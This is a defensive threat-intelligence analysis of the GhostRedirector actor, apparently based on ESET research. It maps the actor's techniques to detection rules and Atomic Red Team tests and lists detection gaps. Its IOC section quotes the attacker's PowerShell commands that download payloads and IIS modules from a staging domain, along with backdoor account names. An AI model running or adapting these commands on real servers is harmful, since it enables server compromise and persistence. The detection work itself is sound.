# GhostRedirector Behaviors Analysis

## Overview
GhostRedirector is a newly identified China-aligned threat actor active since at least August 2024, targeting Windows servers primarily in Brazil, Thailand, and Vietnam. The group uses custom tools including a passive C++ backdoor (Rungan) and a malicious IIS module (Gamshen) for SEO fraud. This analysis is based on the ESET Research blog post from September 4, 2025.

## Key Behaviors Identified

### 1. Initial Access
- **SQL Injection exploitation** on public-facing applications (T1190)
  - `sql_injection_with_long_urls.yml`
  - `ivanti_epm_sql_injection_remote_code_execution.yml`
- **PowerShell downloads** from staging server 868id[.]com
  - `windows_file_download_via_powershell.yml`
  - `powershell_4104_hunting.yml`
- **CertUtil downloads** as alternative LOLBin for payload retrieval
  - `certutil_with_decode_argument.yml`
  - `bitsadmin_download_file.yml`
- **sqlserver.exe with xp_cmdshell** for initial command execution
  - `windows_sql_server_xp_cmdshell_config_change.yml`
  - `windows_sqlcmd_execution.yml`
  - `windows_powershell_invoke_sqlcmd_execution.yml`

#### Atomic Red Team Tests
- T1105 Ingress Tool Transfer
  - certutil download (urlcache) [dd3b61dd-7bbc-48cd-ab51-49ad1a776df0]
  - certutil download (verifyctl) [ffd492e3-0455-4518-9fb1-46527c9f241b]
  - Windows - PowerShell Download [42dc4460-9aa6-45d3-b1a6-3955d34e1fe8]
  - Windows - BITSAdmin BITS Download [a1921cd3-9a2d-47d5-a891-f1d0f2a7a31b]
  - Curl Download File (writes to C:\\ProgramData) [2b080b99-0deb-4d51-af0f-833d37c4ca6a]
  - File Download with Sqlcmd.exe [6934c16e-0b3a-4e7f-ab8c-c414acd32181]
- T1071.001 Web Protocols
  - Malicious User Agents - PowerShell [81c13829-f6c9-45b8-85a6-053366d55297]
  - Malicious User Agents - CMD [dc3488b0-08c7-4fea-b585-905c83b48180]

### 2. Execution & Persistence
- **IIS Module persistence** - Gamshen loaded by w3wp.exe on HTTP requests (T1546)
  - `windows_iis_components_add_new_module.yml`
  - `windows_iis_components_new_module_added.yml`
  - `windows_iis_components_get_webglobalmodule_module_query.yml`
  - `w3wp_spawning_shell.yml`
- **PowerShell command execution** for downloading tools (T1059.001)
  - `powershell_4104_hunting.yml`
  - `windows_file_download_via_powershell.yml`
  - `malicious_powershell_process___encoded_command.yml`
- **Windows Command Shell** execution via cmd.exe (T1059.003)
  - `windows_suspicious_child_process_spawned_from_webserver.yml`
- **Native API usage** for HTTP registration and URL handling (T1106)
  - `windows_powershell_iis_components_webglobalmodule_usage.yml`

#### Atomic Red Team Tests
- T1505.004 IIS Components
  - Install IIS Module using AppCmd.exe [53adbdfa-8200-490c-871c-d3b1ab3324b2]
  - Install IIS Module using PowerShell New-WebGlobalModule [cc3381fb-4bd0-405c-a8e4-6cacfac3b06c]
- T1505.003 Server Software Component: Web Shell
  - Web Shell Written to Disk [0a2ce662-1efa-496f-a472-2fe7b080db16]
- T1059.001 PowerShell
  - PowerShell Command Execution [a538de64-1c74-46ed-aa60-b995ed302598]
- T1059.003 Windows Command Shell
  - Writes text to a file and displays it [127b4afe-2346-4192-815c-69042bec570e]
- T1106 Native API
  - Execution through API - CreateProcess [99be2089-c52d-4a4a-b5c3-261ee42c8b62]

### 3. Malware Components
- **Rungan** - Passive C++ backdoor for command execution
  - `lolbas_with_network_traffic.yml`
  - `suspicious_curl_network_connection.yml`
- **Gamshen** - Malicious native IIS module for SEO fraud
  - `windows_iis_components_add_new_module.yml`
  - `w3wp_spawning_shell.yml`
- **Zunput** - Webshell dropper with embedded payloads
  - `web_remote_shellservlet_access.yml`
  - `supernova_webshell.yml`
  - `detect_exchange_web_shell.yml`
- **GoToHTTP** - Legitimate remote access tool for fallback access
  - `detect_remote_access_software_usage_process.yml`
  - `detect_remote_access_software_usage_file.yml`

#### Atomic Red Team Tests
- T1071.001 Web Protocols
  - Malicious User Agents - PowerShell [81c13829-f6c9-45b8-85a6-053366d55297]
- T1505.004 IIS Components
  - Install IIS Module using AppCmd.exe [53adbdfa-8200-490c-871c-d3b1ab3324b2]
- T1505.003 Web Shell
  - Web Shell Written to Disk [0a2ce662-1efa-496f-a472-2fe7b080db16]
- T1219 Remote Access Software (proxy for GoToHTTP)
  - GoToAssist/TeamViewer/AnyDesk installers (multiple tests in T1219)

### 4. Privilege Escalation
- **EfsPotato exploit** for local privilege escalation (T1134)
  - `windows_privilege_escalation_suspicious_process_elevation.yml`
  - `windows_privilege_escalation_user_process_spawn_system_process.yml`
- **BadPotato exploit** for token manipulation
  - `windows_access_token_manipulation_sedebugprivilege.yml`
- **Registry modification** for RID hijacking (T1112)
  - `windows_modify_registry_disable_restricted_admin.yml`
- **Administrator user creation** with names like MysqlServiceEx, MysqlServiceEx2
  - `windows_create_local_administrator_account_via_net.yml`
  - `windows_create_local_account.yml`
  - `short_lived_windows_accounts.yml`

#### Atomic Red Team Tests
- T1134.001 Access Token Manipulation
  - Bad Potato [9c6d799b-c111-4749-a42f-ec2f8cb51448]
  - Juicy Potato [f095e373-b936-4eb4-8d22-f47ccbfbe64a]
- T1136.001 Create Account: Local Account
  - Create a new Windows admin user [fda74566-a604-4581-a4cc-fbbe21d66559]
- T1112 Modify Registry
  - Multiple tests available in T1112 (select per environment)

### 5. Defense Evasion & Obfuscation
- **.NET Reactor obfuscation** with multiple layers (T1027)
  - `malicious_powershell_process_with_obfuscation_techniques.yml`
  - `windows_obfuscated_files_or_information_via_rar_sfx.yml`
- **Code signing** with Chinese certificate from TrustAsia RSA (T1588.003)
  - *No specific code signing validation analytics found*
- **Embedded payloads** within malware droppers (T1027.009)
  - `suspicious_process_executed_from_container_file.yml`
- **AES CBC decryption** for string obfuscation in Rungan (T1140)
  - `certutil_with_decode_argument.yml`
  - `powershell_fileless_script_contains_base64_encoded_content.yml`

#### Atomic Red Team Tests
- T1027 Obfuscated Files or Information
  - Execute base64-encoded PowerShell [a50d5a97-2531-499e-a1de-5544c74432c6]
  - Obfuscated certutil command (manual) [see T1027]
- T1140 Deobfuscate/Decode Files or Information
  - Deobfuscate/Decode via certutil [dc6fe391-69e6-4506-bd06-ea5eeb4082f8]
  - Certutil Rename and Decode [71abc534-3c05-4d0c-80f7-cbe93cb2aa94]

### 6. Command & Control
- **HTTP protocol** for backdoor communications (T1071.001)
  - `lolbas_with_network_traffic.yml`
  - `windows_http_network_communication_from_msiexec.yml`
- **Staging server** 868id[.]com for tool downloads (T1105)
  - `windows_file_download_via_powershell.yml`
  - `windows_curl_download_to_suspicious_path.yml`
  - `bitsadmin_download_file.yml`
- **Remote access software** GoToHTTP for browser-based access (T1219)
  - `detect_remote_access_software_usage_process.yml`
  - `detect_remote_access_software_usage_file.yml`
  - `headless_browser_mockbin_or_mocky_request.yml`
- **Fallback channels** via created admin users and tools (T1008)
  - `windows_create_local_administrator_account_via_net.yml`
  - `short_lived_windows_accounts.yml`

#### Atomic Red Team Tests
- T1071.001 Web Protocols
  - Malicious User Agents - PowerShell [81c13829-f6c9-45b8-85a6-053366d55297]
- T1105 Ingress Tool Transfer
  - Windows - PowerShell Download [42dc4460-9aa6-45d3-b1a6-3955d34e1fe8]
  - Curl Download File [2b080b99-0deb-4d51-af0f-833d37c4ca6a]
  - BITSAdmin BITS Download [a1921cd3-9a2d-47d5-a891-f1d0f2a7a31b]
- T1219 Remote Access Software
  - GoToAssist/TeamViewer/AnyDesk installers (proxy for GoToHTTP)

### 7. File Locations & Staging
- **ProgramData directory** primary staging location
  - `windows_process_execution_from_programdata.yml`
  - `executables_or_script_creation_in_suspicious_path.yml`
- **C:\ProgramData\Microsoft\DRM\log** specific path for backdoor and IIS trojan
  - `windows_suspicious_process_file_path.yml`
- **Multiple download endpoints** from same staging infrastructure
  - `windows_file_download_via_powershell.yml`
  - `cisco_nvm___webserver_download_from_file_sharing_website.yml`

#### Atomic Red Team Tests
- T1105 Ingress Tool Transfer
  - Curl Download File (writes to C:\\ProgramData) [2b080b99-0deb-4d51-af0f-833d37c4ca6a]
- T1547.001 Registry Run Keys/Startup Folder
  - Startup artifacts in C:\\ProgramData paths (see T1547.001 tests)

### 8. Impact & Objectives
- **SEO fraud as-a-service** manipulating Google search results (T1565)
  - `web_remote_shellservlet_access.yml`
  - `windows_iis_components_add_new_module.yml`
- **Search engine manipulation** targeting gambling websites
  - *No specific SEO fraud analytics found*
- **Data manipulation** of HTTP responses for Googlebot only
  - `w3wp_spawning_shell.yml`
  - `windows_suspicious_child_process_spawned_from_webserver.yml`

#### Atomic Red Team Tests
- Gap: No dedicated SEO fraud atomics. Use IIS Module (T1505.004) and Web Shell (T1505.003) tests as behavioral proxies.

## Specific GhostRedirector Command Patterns & IOCs

### Command Line Behaviors Observed
1. **PowerShell Downloads from Staging Server**
   ```
   powershell curl https://xzs.868id[.]com/EfsNetAutoUser_br.exe -OutFile C:\ProgramData\EfsNetAutoUser_br.exe
   powershell curl http://xz.868id[.]com/EfsPotato_sign.exe -OutFile C:\ProgramData\EfsPotato_sign.exe
   powershell curl https://xzs.868id[.]com/link.exe -OutFile C:\ProgramData\link.exe
   ```

2. **IIS Module Installation**
   ```
   powershell curl https://xzs.868id[.]com/iis/br/ManagedEngine64_v2.dll -OutFile C:\ProgramData\Microsoft\DRM\log\ManagedEngine64.dll
   powershell curl https://xzs.868id[.]com/iis/IISAgentDLL.dll -OutFile C:\ProgramData\Microsoft\DRM\log\miniscreen.dll
   ```

3. **Command Execution via SQL Server**
   ```
   cmd.exe /d /s /c "powershell curl [URL] -OutFile [PATH]"
   ```

### File Artifacts & Infrastructure
- **Staging Domain**: 868id[.]com
- **Subdomain**: xzs.868id[.]com, xz.868id[.]com
- **Installation Path**: C:\ProgramData\Microsoft\DRM\log\
- **Backdoor**: Rungan (C++ passive backdoor)
- **IIS Module**: Gamshen (native IIS module)
- **Webshell Dropper**: Zunput
- **Remote Tool**: GoToHTTP

### User Account Creation
- **Usernames**: MysqlServiceEx, MysqlServiceEx2, Admin
- **Password patterns**: Contains "huang" (Chinese for yellow)
- **Group membership**: Added to Administrators group

### Code Signing Certificate
- **Issuer**: TrustAsia RSA Code Signing CA G3
- **Subject**: 深圳市迪元素科技有限公司 (Shenzhen Diyuan Technology Co., Ltd.)
- **Thumbprint**: BE2AC4A5156DBD9FFA7A9F053F8FA4AF5885BE3C

## MITRE ATT&CK Techniques Observed
- T1588.003 - Obtain Capabilities: Code Signing Certificates
- T1190 - Exploit Public-Facing Application
- T1106 - Native API
- T1059.001 - Command and Scripting Interpreter: PowerShell
- T1059.003 - Command and Scripting Interpreter: Windows Command Shell
- T1559 - Inter-Process Communication
- T1546 - Event Triggered Execution
- T1134 - Access Token Manipulation
- T1112 - Modify Registry
- T1027 - Obfuscated Files or Information
- T1027.009 - Obfuscated Files or Information: Embedded Payloads
- T1140 - Deobfuscate/Decode Files or Information
- T1083 - File and Directory Discovery
- T1105 - Ingress Tool Transfer
- T1219 - Remote Access Software
- T1071.001 - Application Layer Protocol: Web Protocols
- T1008 - Fallback Channels
- T1565 - Data Manipulation

## Victim Profile
- **Primary Targets**: Brazil, Peru, Thailand, Vietnam, USA
- **Secondary Targets**: Canada, Finland, India, Netherlands, Philippines, Singapore
- **Sectors**: Education, healthcare, insurance, transportation, technology, retail
- **Infrastructure**: Windows servers with IIS web services
- **Scale**: At least 65 compromised servers identified

## Summary of Mapped Analytics

### Coverage Analysis
- **Strong Coverage**: SQL injection, PowerShell downloads, IIS modules, webshells, privilege escalation, admin user creation
- **Moderate Coverage**: Remote access tools, file staging, obfuscation techniques
- **Limited Coverage**: SEO fraud detection, code signing validation, specific Potato exploits

### Key Analytics for GhostRedirector Detection
1. `windows_sql_server_xp_cmdshell_config_change.yml` - Detects SQL Server command execution
2. `windows_file_download_via_powershell.yml` - Detects PowerShell downloads
3. `windows_iis_components_add_new_module.yml` - Detects IIS module installation
4. `w3wp_spawning_shell.yml` - Detects webserver spawning shells
5. `windows_create_local_administrator_account_via_net.yml` - Detects admin user creation
6. `windows_privilege_escalation_suspicious_process_elevation.yml` - Detects privilege escalation
7. `detect_remote_access_software_usage_process.yml` - Detects remote access tools
8. `web_remote_shellservlet_access.yml` - Detects webshell access

### Detection Gaps Identified
1. **SEO Fraud Detection** - No analytics detect search engine manipulation
2. **Potato Exploit Signatures** - Missing specific EfsPotato/BadPotato detection
3. **Code Signing Validation** - No certificate thumbprint or issuer validation
4. **IIS Module Behavioral Analysis** - Limited detection of malicious IIS module behavior
5. **Googlebot User-Agent Filtering** - No detection of selective response manipulation

### Potential New Analytics Needed
1. **Windows IIS Module SEO Fraud** - Detect response manipulation for search engines
2. **Windows Potato Exploit Usage** - Detect EfsPotato/BadPotato execution patterns
3. **Windows Code Signing Certificate Validation** - Detect suspicious certificate usage
4. **Windows SQL Server Exploitation Chain** - Detect SQL injection to PowerShell download pattern

### Recommendations
1. Monitor SQL Server xp_cmdshell configuration changes and usage
2. Track PowerShell downloads from external sources to ProgramData
3. Monitor IIS module installations and w3wp.exe child processes
4. Alert on local administrator account creation with suspicious names
5. Implement webshell detection for common web application frameworks
6. Monitor for remote access software deployment and usage

---
*Analysis based on ESET Research blog post: https://www.welivesecurity.com/en/eset-research/ghostredirector-poisons-windows-servers-backdoors-side-potatoes/*
